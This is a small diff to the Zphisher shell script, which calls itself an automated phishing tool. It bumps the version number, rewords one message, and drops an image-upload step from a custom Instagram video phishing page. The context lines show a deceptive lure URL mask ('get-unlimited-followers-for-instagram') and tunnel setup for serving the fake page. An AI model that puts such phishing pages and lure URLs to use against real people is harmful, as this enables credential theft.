@@ -2,7 +2,7 @@
 
 ##   Zphisher 	: 	Automated Phishing Tool
 ##   Author 	: 	TAHMID RAYAT 
-##   Version 	: 	2.3.2
+##   Version 	: 	2.3.3
 ##   Github 	: 	https://github.com/htr-tech/zphisher
 
 
@@ -89,7 +89,7 @@
 ##   TheLinuxChoice - https://twitter.com/linux_choice
 
 
-__version__="2.3.2"
+__version__="2.3.3"
 
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
@@ -568,7 +568,7 @@ site_facebook() {
 custom_video_page() {
 cat <<- EOF
 	
-	${GREEN}[${WHITE}-${GREEN}]${CYAN} It is important that the video is mp4 and 16:9 (horizontal), and also the resolution for the image so that there are no incompatibilitiess
+	${GREEN}[${WHITE}-${GREEN}]${CYAN} It is important that the video is mp4 and 16:9 (horizontal), so that there are no incompatibilitiess.
 	
 	EOF
 	
@@ -579,14 +579,7 @@ cat <<- EOF
 	cp ${videoruta} $(pwd)
 	mv * video.mp4
 	echo
-	cd ..
-	cd image
-	rm -rf *
-	echo -e -n "${RED}[${WHITE}-${RED}]${GREEN} Write the path of the image : ${BLUE}"
-	read imageruta
-	cp $imageruta $(pwd)
-	cd .. && cd .. && cd ..
-	echo
+        cd .. && cd .. && cd ..
 	website="instagram_video_custom"
         mask='http://get-unlimited-followers-for-instagram'
 	tunnel_menu
